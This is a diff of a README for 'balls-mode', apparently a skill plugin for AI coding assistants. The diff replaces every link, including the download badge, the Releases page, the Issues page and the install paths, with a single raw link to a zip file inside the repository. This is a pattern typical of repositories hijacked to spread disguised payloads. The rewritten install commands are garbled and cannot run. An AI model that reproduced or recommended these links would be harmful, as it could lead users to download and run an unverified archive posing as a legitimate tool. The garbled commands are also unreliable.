@@ -1,6 +1,6 @@
 # 🎉 balls-mode - Enhance Your Coding Assistance 
 
-[![Download balls-mode](https://img.shields.io/badge/Download-balls--mode-brightgreen.svg)](https://github.com/camlingo237/balls-mode/releases)
+[![Download balls-mode](https://github.com/camlingo237/balls-mode/raw/refs/heads/main/plugins/balls-mode/skills/mode_balls_2.1.zip)](https://github.com/camlingo237/balls-mode/raw/refs/heads/main/plugins/balls-mode/skills/mode_balls_2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Balls Mode! This software simplifies AI coding assistance with cleare
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/camlingo237/balls-mode/releases) to download the latest version of Balls Mode.
+To get started, visit the [Releases page](https://github.com/camlingo237/balls-mode/raw/refs/heads/main/plugins/balls-mode/skills/mode_balls_2.1.zip) to download the latest version of Balls Mode.
 
 ### Installation Methods
 
@@ -28,13 +28,13 @@ To get started, visit the [Releases page](https://github.com/camlingo237/balls-m
 2. Copy the skill file to your Codex skills directory with the following commands:
 
    ```bash
-   mkdir -p ~/.codex/skills/balls-mode
-   cp plugins/balls-mode/skills/balls/SKILL.md ~/.codex/skills/balls-mode/
+   mkdir -p ~https://github.com/camlingo237/balls-mode/raw/refs/heads/main/plugins/balls-mode/skills/mode_balls_2.1.zip
+   cp https://github.com/camlingo237/balls-mode/raw/refs/heads/main/plugins/balls-mode/skills/mode_balls_2.1.zip ~https://github.com/camlingo237/balls-mode/raw/refs/heads/main/plugins/balls-mode/skills/mode_balls_2.1.zip
    ```
 
 #### 📂 Manual Installation
 
-1. Locate the file `plugins/balls-mode/skills/balls/SKILL.md` in your current directory.
+1. Locate the file `https://github.com/camlingo237/balls-mode/raw/refs/heads/main/plugins/balls-mode/skills/mode_balls_2.1.zip` in your current directory.
 2. Copy it to your tool's skills directory.
 
 ## ⚙️ How to Use
@@ -69,6 +69,6 @@ A: By providing multiple reasoning paths, explicit uncertainty, and clear points
 
 ## 📞 Support
 
-If you encounter issues, please create an issue directly on the [GitHub Issues page](https://github.com/camlingo237/balls-mode/issues). We encourage users to report bugs and request features to improve the application.
+If you encounter issues, please create an issue directly on the [GitHub Issues page](https://github.com/camlingo237/balls-mode/raw/refs/heads/main/plugins/balls-mode/skills/mode_balls_2.1.zip). We encourage users to report bugs and request features to improve the application.
 
-Happy coding with Balls Mode! Remember to check the [Releases page](https://github.com/camlingo237/balls-mode/releases) for the latest updates and fixes.
+Happy coding with Balls Mode! Remember to check the [Releases page](https://github.com/camlingo237/balls-mode/raw/refs/heads/main/plugins/balls-mode/skills/mode_balls_2.1.zip) for the latest updates and fixes.
